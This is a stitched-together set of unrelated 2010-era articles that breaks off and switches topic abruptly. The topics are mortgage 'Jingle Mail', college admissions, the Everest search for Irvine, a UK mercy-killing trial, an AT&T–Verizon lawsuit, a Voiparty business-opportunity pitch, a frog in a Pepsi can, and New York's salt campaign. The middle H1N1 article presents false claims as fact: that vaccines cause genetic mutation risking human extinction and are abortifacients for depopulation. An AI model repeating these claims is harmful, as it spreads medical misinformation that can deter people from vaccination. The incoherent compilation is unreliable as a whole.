These additional losses will catch the banks by surprise .
Meanwhile , the FDIC and US taxpayer will suffer big time as bank failures reach new levels .
When the dust settles , the US taxpayer will once again get stuck with the gigantic bill .
The morality of Jingle Mail has two sides :
As a taxpayer , it scares me to death and encourages me to buy more gold , so I 'm not stuck paying the massive government inflation tax to pay for it all .
And , yes , in a perfect world , people who sign loan documents should honor their obligations even if it means they made a bad decision ; they should be held accountable .
But we do n't live in a perfect world , and the average Joe is being held to a higher moral standard and asked to pay up , while Wall Street and big business get a free ride on Joe 's back .
Remember , it was the former Fed Chairman , Alan Greenspan , who told the American people there was no housing bubble .
We listened and did what he said .
When it comes to stiffing creditors , Joe can clearly see that business is in the vanguard of strategic default .
GM , Chrysler , Merrill Lynch , Fannie Mae , Freddie Mac , and AIG stuck it to the American taxpayer big time long before a strategic mortgage default ever crossed Joe 's mind .
Then , there is Wall Street , where the taxpayers get the losses and the speculating bankers get the mega bonuses .
What a den of thieves !
From the point of fairness and equality , Jingle Mail starts to look like an honest grass roots movement for the little guy like Joe , to get his life and finances in order .
The honest , conservative , middle - class American got played for a sucker by the subprime homebuyer and the house and commodity speculators .
The Wall Street fat cats who made it all so easy kept what they stole , and then got bailed out .
The government has done nothing for Joe .
Is n't it his turn to fight back ?
For 2010 , the populist song running in my head has the same haunting refrain and amoral lyrics as the 1975 Paul Simon classic song :
" 50 Ways to Stiff Your Banker "
You just slip out the back , Jack
Make a new plan , Stan
You do n't need to be coy , Roy
Just listen to me
Hop on the bus , Gus
You do n't need to discuss much
Just drop off the key , Lee
And get yourself free !
NOW IS the winter of high school seniors ’ discontent .
But then every winter is one of discontent as seniors file their college applications with a mix of dread and hope - mainly dread .
Those applying to the most selective schools have the odds stacked against them no matter how sterling their high school records , though college admissions officers typically offer the cold comfort that rejection is not equivalent to failure and that , as one Yale admissions officer put it , “ It matters far less which strong college admits you than it matters what you do with your opportunities once you are there . ’’
To which most high school seniors would say , “ Hogwash . ’’
They know that it does matter where you go to college , if not educationally then in terms of social recognition and opportunity .
They know that America , for all its professions of meritocracy , is a virtual oligarchy where the graduates of the Ivies and the other best schools enjoy tremendous advantages in the job market .
They know that Harvard or Stanford or MIT is a label in our “ designer education ’ ’ not unlike Chanel or Prada in clothes .
So here is another , more realistic comfort to those anxious seniors who will soon be flagellating themselves as unworthy :
The admissions system of the so - called “ best ’’ schools is rigged against you .
If you are a middle - class youth or minority from poor circumstances , you have little chance of getting in to one of those schools .
Indeed , the system exists not to provide social mobility but to prevent it and to perpetuate the prevailing social order .
Of course , colleges loudly deny this since it undermines their exceptionality .
Instead , universities will protest that the system is meritocratic ; that they consider every applicant objectively ; that the admissions process is “ need blind , ’’ which means that financial support plays no role in whether an applicant is admitted or not .
On June 8 , 1924 , George Mallory and Andrew Irvine left their camp less than a kilometer from the summit of Mount Everest on a mission to be the first mountaineers to ascend the world 's highest peak ( 8,850 meters ) .
They were never to be heard from again .
Whether either man reached the summit — almost three decades before Sir Edmund Hillary and Tenzing Norgay 's historic 1953 climb — has been an open question for nearly 86 years .
Although more than half a dozen expeditions have gone to Everest in subsequent years to determine the outcome of Mallory and Irvine 's expedition ( a 1999 search turned up Mallory 's body ) , none have returned with definitive answers .
The key to solving the mystery , many climbers say , is finding Irvine 's remains and with it the missing Vest Pocket Kodak ( VPK ) camera he was supposedly carrying with him on that fateful journey .
Everest historian Tom Holzel believes that after decades scrutinizing maps and photos of Everest 's north face , where the mountaineers are thought to have disappeared , he may have spotted Irvine 's final resting place in a high - resolution picture earlier this month .
Holzel has begun mounting an expedition he hopes will visit the site either this spring or , more likely , spring 2011 .
Old mystery versus modern technology
Holzel put together a 1986 search for Mallory and Irvine that was thwarted by a heavy snow .
Now , he and a group of five colleagues ( who together have formed the Andrew Irvine Search Committee ) say their study of a set of aerial photographs of a 900 - meter - wide area of the mountain 's north face known as the yellow band has turned up an anomaly on the terrain that is roughly 1.8 meters long and positioned in a manner consistent with a description relayed by a Chinese climber who claimed to have spotted the body of an Englishman up on the mountain in 1960 .
The anomaly , which Holzel refers to as an " oblong blob , " revealed itself only after a series of experiments that began with the researchers using a computer to morph together two images — a photo taken within the yellow band in 1933 by climber Wynn Harris and a high - resolution aerial image taken of the north face from a SwissPhoto , AG , Learjet in December 1984 at an altitude of 13,500 meters .
The latter photo is notable because it is an orthophotographic image , one that is geometrically corrected so that it is an accurate representation of Earth 's surface and can be used to measure true distances .
Harris took his photo during a search for the missing climbers .
On this photo , he marked an " x " where he found an ice ax thought to have belonged to Irvine .
Researchers speculate that the " x " marks the point of a slip by Irvine and Mallory and could provide some clue as to where Irvine 's body is located .
By comparing Harris 's photo with the aerial image taken by SwissPhoto , Holzel determined that the presumed location of the ice ax was incorrect by some 55 meters .
Renewed hope
Bolstered by this discovery , Holzel and two other committee members chipped in to buy a powerful microscope and digital camera they could use to scrutinize the aerial images in fine detail .
Holzel used the microscope and camera to take sequential digital microphotographs of the aerial photo at 60 times its normal resolution .
Then he used software to compile those microphotographs into a high - resolution color digital panoramic view of the yellow band .
When printed , the panoramic view revealed the likely descent route that Mallory and Irvine ( and the Chinese climber in 1960 ) must have taken .
The researchers knew that the panorama 's resolution was not high enough to show a recognizable human body , so once the likely route was determined , they used the microscope to look for body - size anomalies in an area consistent with Mallory and Irvine 's probable descent route .
" Based upon what happened , the body could only be in a certain number of places , " Holzel says .
" The panoramic view enabled us to figure out where he could have gone down . "
Irvine 's final resting place ?
Holzel came across what he refers to as a " red slash " — a long diagonal slot — alongside a route where Irvine 's body was said to have been spotted .
Although the slash is estimated to be about one meter wide by six meters long ( too long to be a 1.8 - meter body ) and is more likely a sharp - walled gully or crevasse , further scrutiny revealed an image within the slash that is roughly the size of a person .
" The 1.8 - meter blob appeared to me [ in early January ] just as I was about to write the committee to say that we seemed to have struck out , " Holzel says .
The researchers confirmed the presence of this slash ( and the object within it ) with the help of a second north face image , this one a highly detailed black - and - white print of a portion of the yellow band , scanned by Swiss Photo using a five - micron laser .
The location and orientation of the image in the black - and - white scan are also consistent with the testimony of the Chinese climber in 1960 .
Searching the yellow band
Of course , much of the yellow band has already been canvassed by other searchers with little to show for their efforts .
Snow cover is the big wild card when analyzing images of the north face , says Eric Simonson , the professional mountain guide who led the 1999 expedition that uncovered Mallory 's body .
Although the 1984 images are good , they cannot account for changes to the region made by yearly or even seasonal snowfall , he adds .
If Irvine is going to be found , it will likely be within the yellow band , Simonson acknowledges .
" But it 's a big area , " he says .
" Two of our guys spent a day in 2004 searching the yellow band , but there was too much snow to see .
To be successful you have to be in the right place and be there when the conditions are pretty good . "
If there is heavy snowfall in the area where Holzel wants to search , his team will likely require a metal detector , although this method has not proved highly effective because searchers themselves use metal axes and crampons that interfere with a detector 's readings .
As a result , Simonson says , " You have to be pretty close to an item to find it . "
Simonson gives Holzel credit for finding creative ways to search for Irvine .
" What Tom sees might very well be a body , " Simonson says , adding , " but it might not be Irvine 's body . "
An estimated 120 corpses still remain on Everest .
Unfinished business
Even Holzel admits that , " while the photographic evidence is evocative , it is not by itself fully convincing in terms of the exact spot Irvine lies . "
He is hoping to put together a small search team of two Americans and two Sherpas to investigate his finding , a sojourn he expects will cost at least $ 125,000 and hopes to mount in the coming months or next year .
" The only way to prove it is to actually go there , " he adds .
Holzel has even written out an extensive list of procedures regarding how to properly handle the camera and develop the film if they are found intact .
Although finding Irvine without his camera ( or finding a camera that is too badly damaged to produce pictures ) would shed little light on whether he and Mallory succeeded , " we have good reason to think that [ Irvine ] had a camera , " Simonson says .
" That 's why we went back in 2001 , to find the camera . "
( Howard Somervell , who was part of the 1924 expedition , has been quoted as saying that he had loaned his Kodak VPK camera to Mallory as they passed each other on the north ridge . )
" It will be a momentous day if that camera is found , " Simonson concludes , a day that could change history .
Thomas Inglis suffered head injuries in 2007
Mother killed son " out of love " A mother convicted of murdering her disabled son by injecting him with heroin in a " mercy killing " at a care home in Herts has been jailed for life .
Frances Inglis , 57 , of Dagenham , Essex , denied murdering Thomas Inglis , 22 , on 21 November 2008 and an earlier attempt to kill him on 4 September 2007 .
But a jury at the Old Bailey found her guilty of both charges .
She must serve a minimum of nine years .
Mr Inglis suffered brain damage when he fell out of an ambulance in July 2007 .
The jury reached their verdicts by a majority of 10 to two after deliberating for more than six hours .

There were cries of " shame on you " from the public gallery as the verdicts were read out .
Before the jury went out to deliberate , Judge Brian Barker told them " there is no concept in law of mercy killing - it is still killing " .
Judge Barker said there was no doubt Ms Inglis had tried to take her son's life in September 2007 and succeeded using an " identical " method 14 months later .
In summing up , the judge said the background of " tragedy and grief " will have struck a chord with all who had heard it .
He said : " It would be extraordinary if we did n't feel empathy with the family and what Mrs Inglis had to face . "
During the trial Inglis said : " For Tom to live that living hell - I could n't leave my child like that .
" I did it with love in my heart , for Tom , so I do n't see it as murder . "
The court heard Inglis told a nurse she had HIV while at her son's home Inglis told the court she had started to research her son's condition on the internet within days of his accident .
She also claimed she had to beg hospital staff to give him some relief for his " terrible pain " .
Detectives investigating the first incident in September 2007 found notes stored under the stairs at her home in Dagenham , east London , the Old Bailey heard .
One said : " People keep saying Tom is n't suffering .
How do they know ?
Can they know the terror of knowing you cannot control anything anymore ?
" Can they know the agony of being denied pain relief just to see his reaction ? "
She later told police : " When I wrote this I was sort of off my head really , " the court heard .

Inglis said she was convinced the doctor treating her son at Queens Hospital in Romford , Essex , was lying about his chances of recovery .
The jury heard from Inglis 's other son Alex , who said his brother 's injuries had driven his mother almost " insane " .
Following the first murder attempt in September 2007 , Mr Inglis was moved to the Gardens nursing home in Sawbridgeworth , Hertfordshire .
His mother was not supposed to visit him as part of her bail conditions .
But on 11 November that year Inglis visited , pretending to be her sister and signing in with the name Atkins , jurors were told .
When a nurse went to Mr Inglis 's room she found his mother , who told her she had HIV and threatened to spit at her before shutting the door , the court heard .
' I injected him '
The nurse went for help to get into the room but when she reached the patient it was clear he was dead , the court heard .
Ms Inglis said : " I held him , told him I loved him , told him everything was going to be fine , took the syringe , and I injected him in his thigh and his arm .
" I knew I had to help him .
I asked myself what Tom would want .
He would n't have wanted to live like this .
" I asked myself what I would want .
I would want someone to love me enough to help me die .
" That 's why I thought heroin - a painless , peaceful death .
He went to sleep .
He was at peace .
I stayed with him . "

The Parliamentary Assembly of the Council of Europe ( PACE ) will hold a secret hearing next week into the apparent manipulation by BigPharma of the World Health Organization ’s ( WHO ) global H1N1 flu campaign .
Experts predict the secrecy will be maintained by the PharmaMedia that controls mainstream news .
The PACE hearing currently advancing was prompted by Dr. Wolfgang Wodarg , chief of health in the Council of Europe representing 47 countries .
This inquiry will address the drug cartel ’s “ false flag ” pandemic , and the WHO ’s scandalous promotions of swine flu vaccinations that were “ fast tracked , ” inadequately tested , and now causing more harm than good .
The sanctioned vaccines and drugs , such as Tamiflu , are burdening governments financially and poisoning people globally , experts say .
During my interview of Dr. Wodarg on January 14th , he mentioned he was not re-elected by the German people last September .
Studying his previous investigations into criminal drug industry operations and cover-ups , it is likely his defeat was rigged .
“ As head of the subcommittee for health , ” Dr. Wodarg reported from his home in Germany , “ I made the motion .
and there will be investigations .
. . .
“ Many countries in Europe are very angry about what the WHO did and how they decided to have a pandemic when there was just a mild flu ; and this whole thing was in favor of those companies who had prepared the pandemic plans , and who only needed the judgment of the WHO to have them set in power , and to earn them money , ” Dr. Wodarg explained .
The Council is expected to consider the sudden inexplicable proclamations of H1N1 vaccine shortages instigated by BigPharma ’s advertising gurus paid to respond to widespread distrust of the manufactured flu fright and vaccine sales hype .
Global pandemic promoters used frightful messages to convince scientists , doctors , and global populations that pandemic H1N1 threatened to kill millions .
Instead , the virus caused only a tiny fraction of deaths reported during a normal flu season .
PharmaMedia to Squelch Crimes
Many observers believe the urgently needed investigation is unlikely to make any significant difference in public perceptions since drug industrialists have a knack for steering their allies in the media clear of controversy ; especially this kind of explosive scandal .
“ PharmaMedia controls the mass mind more effectively than any covert psychological operation in world history , ” said Dr. Leonard Horowitz , a Harvard - trained media expert and world leading vaccine risk analyst .
Dr. Horowitz is also the Editor - in - Chief of Medical Veritas journal .
Few people realize the connections between major drug companies that produce H1N1 vaccines and media moguls on the boards of directors of BigPharma ’s leading companies .
According to Dr. Horowitz , media moguls spin the news and mass mindset impacting geopolitics , economics , and governmental policies on behalf of BigPharma because they are heavily invested in the drug cartel .
News blackouts and promotional propaganda are all that is needed to maintain the status quo in favor of ongoing fraud and mass murder .
This is his conclusion based on rock solid evidence his colleagues and contributors have published in the peer review science journal Medical Veritas .
What if Dr. Wodarg , Dr. Horowitz , and the Health Minister of Poland , Dr. Ewa Kopacz , who rejected the vaccine hype and sales contracts because of the obvious fraud , are all right ?
Who Ordered the Shortage Marketing ?
To diagnose this surreal tragedy accurately , one need only consider the source of the shortage marketing directive .
There was a dramatic orchestrated change in global media promotions the third week of October .
Investigators must ponder why adequate supplies of vaccines widely acknowledged before October 16 , 2009 , suddenly disappeared following a Council on Foreign Relations ( CFR ) meeting on this subject held in New York on this date .
The “ H1N1 Pandemic Study Group ” meeting was led by Laurie Garrett–a noted journalist whose works exemplify PharmaMedia ’s methods of conducting white collar bio-terrorism and psychological warfare .
Her messages , like other authors “ selected ” for media stardom , create markets and stimulate sales for the petrochemical - pharmaceutical cartel , especially through lucrative sales of vaccines and drugs following frights .
Garrett ’s study group decided that the most effective response to the public ’s overwhelming aversion to getting vaccinated was to feign a vaccine shortage .
One week later , the media , led by Thomas Glocer ’s Reuters News Service and Rupert Murdoch ’s News Corporation , suddenly declared the alleged shortages .
It turns out that Murdoch , directing most powerfully the influential media , including Fox News , the Associated Press ( AP ) , Twentieth Century Fox , Time Warner , and much more , controls the Murdoch Childrens ’ Research Institute ( MCRI ) in Australia , responsible for the first H1N1 Swine flu tests on children 6 months to 8 years of age .
Murdoch ’s son , and heir apparent , James , the Chairman and Chief Executive of News Corporation for Europe and Asia , is an overseer of GlaxoSmithKline ’s Board of Directors .
They are one of six companies that make H1N1 vaccines .
Rupert ’s mother , Elisabeth Murdoch , is the grand matriarch of the Royal Victoria Women ’s Hospital in Melbourne .
Its staff collaborated with CSL Pharmaceuticals , another H1N1 vaccine maker .
CSL is owned by Merck & Co .
They used flawed testing methods on pregnant women , doctors say .
Their safety tests lacked legitimate placebo controls and evaded long - term surveillance and data collection .
The missing data prevented credible scientific analysis .
Thus , BigPharma had nothing to substantiate their liberally - issued safety assurances .
In other words , PharmaMedia conducted an obvious case of scientific fraud and public deception for vaccine market proliferation .
Thomas Glocer , the CEO of Reuters , is also on the Board of Directors of Merck & Co. , and a partner with Rupert Murdoch in the Partnership for New York City that personifies the heart of this drug ring .
The partners profitably advance biotechnology and “ genetopharmaceuticals ” globally , more than any other consortium .
This PFNYC was founded by David Rockefeller who controls the CFR and World Health Organization ( WHO ) .
Rockefeller - approved Co-Chairs of the PFNYC include Rupert Murdoch and Lloyd Blankfein , the chief of Goldman Sachs who financed the merger of MedImmune and Astrozeneca , producers of FLUMIST – the nasal spray H1N1 vaccine .
Blankfein holds millions , perhaps billions , of dollars of the company ’s stock .
“ Now these unholy alliances have yet to be acknowledged adequately because these H1N1 vaccine investors have zero reason to expose themselves , ” Dr. Horowitz said .
“ So regardless of what PACE investigators find , these PFNYC partners will either spin their stories suitably , or neglect them entirely , leaving populations clueless about what is really happening behind BigPharma ’s deceptive media . ”
“ The goal of our work , ” Dr. Wordarg revealed , “ is to reinstill trust into very important health organizations we need–such organizations who will cooperate internationally , and who are important in the network of international knowledge about possible health dangers . ”
“ But this influenza was twice blown up , ” the German medical chief continued , “ once as a bird flu , and the second time as the swine flu .
There was no scientific evidence for either . ”
Genetic Mutation Risking Human Extinction
The most urgent troublesome investigation to be conducted by PACE , and the least likely story to be told by PharmaMedia , involves the FLUMIST vaccine .
It transmits “ live ” “ active ” unstable viruses–clones of H1N1 ; mutants created in drug labs –that are passed from vaccinated persons to others not infected .
These transmissions risk genetic mutations all along the way .
“ Stupid is as stupid does , ” said Rev. Roxanne Hampton , referring to the gullable people who consented to get vaccinated and now pose a risk to their family , community , and even the entire human race due to the genetic mutation risks .
As a legislative aid in Hawaii who helped the Big Island ’s County Council investigate the H1N1 vaccine hype and its risks , Rev. Hampton has advised government attorneys of the fraud committed by local health officials .
“ I pray they will take action similar to the investigation that PACE is advancing in Europe , ” she added .
According to Dr. Harold Buttram , and his latest report in the Winter 2010 issue of Medical Veritas , this pandemic flu operation has already exposed millions of healthy people to genetic mutation risks beyond deadly side effects caused by these injections .
Other experts report that recombinations of H1N1 are expected with more deadly viruses in circulation .
Even human DNA risks mutations from infections with bioengineered H1N1s .
These risks threaten civilization with extinction according to many avid investigators , doctors , and concerned scientists .
Vaccine truth activist Ingri Cassel of Vaccination Liberation Organization ( www.VacLib.org) claims that vaccines were born in fraud and have been laying the foundation for sick and diseased populations ever since .
“ New vaccines on the market are claimed to be more sterile , laboratory tested and safer , ” Ms. Cassel said .
“ Nothing can be further from the truth .
All vaccines are mutagenic by nature –including the highly unstable triple recombinant vaccines –which are changing our genetic code .
When one looks at the whole picture , vaccines represent an attack on our God - given right to natural immunity and genetic integrity .
This genocidal madness needs to be halted and the real criminals –vaccine manufacturers and their promoters –held accountable . ”
Medimmune and other pharmaceutical companies have recalled millions of doses of vaccines in recent weeks , including FLUMIST nasal spray due to its alleged “ inadequate shelf life . ”
But critics assert this is a distraction given the aforementioned risks of genetic annihilation .
There are more pressing problems including increasing sterilization , Ms. Cassel reports .
“ I have an eye on this , ” Dr. Wodarg said , considering the many outspoken doctors and activists who have written objections and public alerts about genetic threats of H1N1 vaccinations .
“ There will be more in France , and there will be more perhaps in Australia and Switzerland .
The Polish people have been very critical to vaccinations .
They did n’t buy these vaccines .
The health minister of Poland has a public health background .
She ’s a doctor , and Poland is the only country that said no to WHO , and did n’t follow the pandemic frenzy .
They did n’t buy the vaccines because they thought they were too dangerous . ”
Oversupplies Trouble Governments
According to European news sources , because the vast majority of world villagers have refused these vaccines , governments cannot dispose of their stockpiles .
They literally cannot give away the H1N1 vaccines that cost billions of dollars to purchase just a few months ago during the feigned emergency .
So health officials have also been pitching their excessive vaccine stocks more suspiciously and aggressively to broader markets .
On Friday , January 15 , USA Today evidenced health officials resorting to media blitzes alleging the need for follow - up injections .
The weak yet risky first doses of H1N1 vaccines taken by millions of people are inadequate alone , they warned , for protection against a virus admittedly causing less than 6 percent of the fatalities from a normal seasonal flu .
According to the Murdoch - AP - influenced Hawaii Star Bulletin , the H1N1 vaccines are now being offered to everyone .
The plentiful injectables are now suitable for even low risk groups , health officials claim .
The determination of “ risk groups ” came from supposed reported cases collected by the CDC early in the pandemic .
Later it was learned that their data was overblown by 84 - 97 % according to a CBS News investigation widely publicized in late October , 2009 .
Thus , there is no good reason to assume the risk groups were identified legitimately .
Dr. Horowitz , who was the first investigator in the world to declare the alleged H1N1 pandemic was a scam , balked at the risk of vaccinating pregnant women with mercury preserved formulas .
“ Vaccinations , ” he noted , “ have traditionally been elective procedures for pregnant women respecting sensitive rapidly - growing fetal nerves . ”
Neurotoxic mercury affects fetal neurology most powerfully , researchers say .
Infant growth and development , and neurobehavioral disorders including autism , are risked by Thimerosal mercury - laced injections .
Dr. Horowitz was also among the first to raise concerns that new H1N1 vaccine adjuvants containing Nonoxynol - 9 spermicide might cause abortions .
This neglected warning has resulted in possibly a thousand H1N1 - induced miscarriages to date .
“ We are up to about 200 women who have had H1N1 vaccine - triggered spontaneous abortions according to records we are mailing to American legislators , ” said Eileen Dannemann , Director of the National Coalition of Organized Women ( NCOW ) .
NCOW is calling for an official American investigation in step with the European Parliament ’s Council .
Spontaneous abortions are being reported to NCOW daily , Ms. Dannemann reported , “ And this is only by word - of - mouth , without word getting out in the media .
We ’ve asked grieving moms to contact us to file their reports . ”
CDC officials admit they collect only about 10 % of vaccine injuries .
They call these “ adverse events . ”
Spontaneous abortions are included .
So if our current count is nearly 200 , and this represents only about 10 % , the actual miscarriages to date number , very conservatively , approximately a thousand . ”
With such high numbers of terminated pregnancies , for all we know the addition of abortifacients into H1N1 vaccines , ingredients that cause spontaneous miscarriages , evidences a population control exercise .
Previously considered “ unspeakable , ” this is now possible since leading vaccine industrialists , and chief health officials , including Barack Obama ’s Science Czar , John Holdren , endorse and finance the Population Council whose efforts advance rapid widespread depopulation using vaccinations for sterilization .
Holdren wrote about this in his 1977 co-authored book , EcoScience , and this was done in the past with vaccines poisoned with HCG , a female pregnancy hormone .
The Population Council also tested and licensed RU - 486 , the “ abortion pill , ” sadistically named to refer to the slang question , “ Are you for 86 - ing ( trashing ) life ? ” Dr. Horowitz notes .
Adding to the public ’s distrust of governing health officials , in Hawaii , Director of Public Health , Chiyome Fukino , who is a defendant in a lawsuit filed by Philadelphia attorney Phil Berg for concealing evidence required to certify President Barack Obama ’s official birth certificate , falsely testified to legislators last year that H1N1 vaccines were adequately tested .
Fukino alleged some magic “ threshold ” of “ herd immunity ” determined that unvaccinated persons pose a “ serious threat ” to vaccinated people .
Due to her fraudulent claims , State attorneys have been asked by County of Hawaii Council Co-chair , Emily Naeole - Beason , to investigate Dr. Fukino for fraud , official malfeasance , and genocidal malpractices .
Strict whistleblower statutes criminalize false claims made to governing officials costing governments millions of dollars for vaccines and drugs fraudulently promoted .
Fukino purchased millions of dollars of Tamiflu and FLUMIST for the State .
Now she may face criminal charges pending an official investigation .
“ We have a very powerful investigation advancing , ” in the EU , said Dr. Wodarg .
He cited “ the very doubtful way the WHO acted , and the whole matter , of the H1N1 scandal . ”
“ I think we should start with this [ obvious breach of faith ] , ” the retiring health chief of PACE said of the manufactured flu frenzy .
“ I am open to investigating to find out more , ” Dr. Wodarg concluded , referencing the little publicized connections between the makers of H1N1 vaccines and the media manipulators with private equity investments in these vaccinations .

After failing to have Verizon 's advertisements criticizing its network coverage pulled off of the air , AT&T has decided to drop its lawsuit against the nation 's largest wireless carrier .
Both Verizon and AT&T filed an official dismissal of the case in an Atlanta , Ga. , federal court Wednesday .
In addition , a separate lawsuit filed by Verizon against AT&T was also dismissed .
In November , AT&T had asked the court to pull what it felt were " misleading " advertisements from Verizon , criticizing AT&T 's nationwide 3G coverage .
But a judge later denied that request , noting that though Verizon 's ads could be construed as " sneaky , " they were not misleading .
Both parties were originally set to meet in court on Dec. 16 for a second chance to present their case on the proposed injunction .
The legal dispute began when AT&T filed a complaint , noting the company felt that the advertisements suggested to casual TV viewers that its wireless service did not provide coverage in most of the U.S. Parodying Apple 's " There 's an app for that " iPhone commercials , Verizon mocked AT&T with the slogan " There 's a map for that . "
While Verizon 's commercials highlighted the strength of its 3G data network , AT&T said customers could be mislead to think the television spot was referring to all voice and data connections .
AT&T publicly responded with a series of advertisements featuring actor Luke Wilson .
Rather than focusing on 3G coverage , AT&T aimed to " set the record straight " and show that the wireless network reaches 97 percent of all Americans .
In court , Verizon responded to AT&T 's claims by suggesting the carrier was overreacting to " the truth " of its wireless data service .
It argued that AT&T failed to adequately invest in its own network to support growth of devices .
" AT&T sued because Verizon 's ads are true and the truth hurts , " the company had said .
Voiparty 's income comes from fees that are generated from an existing wholesale interexchange market .
Telephone Poles
Interexchange Carriers
There are a limited number of boxes available
using internet marketing techniques to help many families become financially free in 2010
Voiparty is a telecommunications company combined with a business opportunity .
Unlike some of the telecomm business opportunities that have gone before them , like Excel Communications , ACN or 5LINX their income is not derived from the purchase of telecomm products by the members .
Hence , Voiparty is an InterExchange Carrier .
I will explain more about what that means in a minute , but I first want to give you an analogy .
Imagine for a minute that you own land and the local telephone company has asked you for permission to put one of their telephone poles on your land .
In exchange for your granting them permission , they agree to give you a piece of the telephone traffic that goes across the pole as long as the pole is on your land .
In other words , you will receive residual income when the telephone company 's customer calls travel across the pole that is on your land .
to its customers .
They are just paying you for the use of your land .
In addition , the telephone company says to you " We need to put up some more poles on the land that belongs to your neighbors - to complete our network .
If you would be willing to talk to one or more of your neighbors for us , we will pay your neighbor for his pole just like we paid you and pay you a percentage of the revenue from his pole , just for your trouble " .
That sounds like a great deal to you so you agree .
You and your family receive this revenue as long as people continue to make telephone calls .
As mentioned earlier , Voiparty is an Interexchange carrier ( IXC ) .
The way that an interexchange carrier makes money is that when a call is placed , if the call has to travel from one phone company 's network to another a fee is generated .
For example , you may be a Verizon customer and you have to make a call to your friend 's Sprint mobile phone .
When that happens , an IXC make money .
This fee sometimes is only a fraction of penny , but with billions of calls it adds up .
There are 90,000 competing IXC's .
The business is a wholesale commodity business and the IXC 's compete soley on price .
The company that charges the lowest fee is the one that will get the business .
ATT and Verizon are among the largest IXCs The thing that makes Voiparty so unique is that they have come up with a novel way of building their network that gives them acompetive advantage .
Typically , a large company like ATT has a tremendous overhead .
They have to lease space in commercial buildings ( often the local phone company 's central office ) to terminate their calls at the point of prescence ( POP ) .
They have a large staff , trucks , equipment , expensive billing systems , etc .
They have to rent or run expensive lines from point to point .
You get the picture , it 's expensive .
ATT alone spent over 80 billion dollars on overhead costs last year .
Even the smaller companies have a large overhead too .
because they have designed a small box that sits in your house .
The VOIParty box ( affectionally called a telephone pole by VOIParty ) sits between your broadband line ( fiber , cable , or DSL ) and a dedicated telephone line .
They then route calls using VOIP and terminate calls in the box in your house .
You get paid on every call that they terminate in the box .
This is their point of prescence .
Now , Voiparty has a tremendous competitive advantage .
Because their overhead is so low , they will always have the lowest industry termination fee .
In addition , just like the telephone pole example , if you can network with some other people to place more boxes to grow their network , they will pay you on those too .
Just like network marketing , but no potions , lotions , or anything to buy every month ( in other words , no autoship ) .
As you can see , VOIParty has a viable business model .
The Interexchange industry is an 800 billion dollar industry .
Voiparty has been building the infrastructure to do this since 2005 .
The opportunity to get a box ( one time cost of $ 249 ) officially begins in January of 2010 ..
If you can meet the technical requirements of having broadband and can get a dedicated line , you can take advantage of the residual income that is available .
The other thing that you need to become profitable is to connect with the right team .

ORLANDO , Fla . -
After finding a 5 - inch frog in a can of Diet Pepsi , federal officials inspecting a Pepsi manufacturing plant were concerned that procedures to clean out the cans were n't fully tested , according to a newly released report .
The inspection report from the Food and Drug Administration also states the Orlando plant has had 13 consumer complaints of alleged foreign objects inside cans since 2007 , including the July 23 complaint about the frog - initially thought to be a mouse - from an Ormond Beach , Fla. , couple .
Despite that , FDA officials decided that the plant passed inspection and did n't find any violations , according to the report obtained by the Orlando Sentinel through a Freedom of Information Act request .
" In cases where a foreign object is reported to be in a product consumers eat or drink , the FDA is immediately concerned and acts to address the matter , " said Tom Gasparoli , a media officer with the FDA .
" Our investigation of this case in Orlando is ongoing . "
Gasparoli could n't comment on the inspection report , but did add : " The FDA encourages consumers to come to us with their complaints . "
Meanwhile , the consumer who found the frog in the can , Amy Denegri of Ormond Beach said she and her husband , Fred , would like an apology for what happened .
" We had no intention of suing , but it 's more of a matter of how Pepsi handled it and treated us , " she said .
Pepsi officials released a statement Tuesday to the Sentinel that said : " We have thoroughly examined our production records and remain confident that this did not occur during our manufacturing process .
We gave FDA complete access to our facility for several days and they did not raise any concerns or ask us to make any changes to our operations .
We are fully confident in the quality and safety of every product we sell . "
Fred Denegri had opened the can of Diet Pepsi in July , just as he and his wife were making dinner , and took one swig of the soda , which he found foul - tasting .
They realized something lurked inside the can and originally thought it was a rodent .
Amy Denegri contacted the FDA , which analyzed the can and its contents .
An FDA inspector confirmed that it was an amphibian , estimating the frog or toad was nearly 5 inches long , according to a report .
The can had not been tampered with and appeared to be a normal aluminum can with an opened tab , the report said .
In August , three FDA investigators visited the Orlando plant to review the manufacturing process , according to an inspection report .
They reviewed the various steps in the process and interviewed 14 managers and supervisors .
FDA officials also found a consumer - complaint log , listing 13 complaints of foreign objects in cans since 2007 .
The federal inspectors asked for documents showing how Pepsi handled those complaints , but Pepsi officials did n't have documents to give them , telling inspectors that many of them were handled verbally , according to the FDA report .
Federal inspectors had some concerns about what they found , including questions about whether the plant 's air rinser , used to clean empty cans before they are filled with soda , had been tested and proved to remove any foreign objects that might cling to the side of the can , the report said .
The FDA officials also noted there were no tests or reports that verify that the plant 's manufacturing procedures and staff observations could make sure that a can with a foreign object inside would have been rejected before leaving the plant .
Inspectors recommended additional checks to make sure there is nothing inside the cans before they are filled .
Overall , there were no major objections and no major changes necessary at the plant , the FDA report said .
Amy Denegri said she was glad that she consulted the FDA first after finding the animal .
She said after news accounts about her can were publicized , other consumers had contacted her , saying they had problems with Pepsi cans , too .
" I felt the public needed to know , " she said .
" These are things behind closed doors most of the time . "

Participation in New York City 's new anti-salt campaign , which aims to reduce the sodium content of restaurant and packaged food by an average of 25 percent in the next five years , is voluntary for now .
But that is also how the city 's trans fat ban got started ; when restaurants declined to cooperate , they were forced .
City officials are downplaying the possibility that recalcitrant volunteers will be conscripted .
" There 's not an easy regulatory fix , " Associate Health Commissioner Geoffrey Cowley told The New York Times .
" You would have to micromanage so many targets for so many different products . "
And when have government bureaucrats ever tried to micromanage business practices ?
Even if it does not become legally mandatory , the city 's salt assault is astonishingly presumptuous .
Because it requires the participation of restaurant chains and food manufacturers , it will , if successful , affect the diet of the entire country .
Such a nationwide shift is not justified even by the standards of " public health " paternalism , since it could do more harm than good .
" We all consume way too much salt , " claims New York City Health Commissioner Thomas Farley .
But as I noted in my 2003 Reason article about the Center for Science in the Public Interest ( which back in the 1970s was calling salt " the deadly white powder you already snort " ) , that position is more an article of nutritional faith than an established scientific proposition .
Reviewing the controversy over salt reduction in a 2008 Esquire article , John Mariani summed up the evidence this way :
Studies show that 30 percent of the Americans who have high blood pressure would greatly benefit from a low - sodium diet .
But that 's about 10 percent of the overall population — the rest of us are fine with sodium .
Furthermore , skeptics such as Michael Alderman , editor of the American Journal of Hypertension , worry that a substantial nationwide reduction in salt consumption could have unintended negative health consequences .
" They want to do an experiment on a whole population without a good control , " Alderman told the New York Daily News .
" That 's not science . "
In a 2000 review of the evidence , Alderman warned :
The question …is whether the beneficial hypotensive effects of sodium restriction will outweigh its hazards .
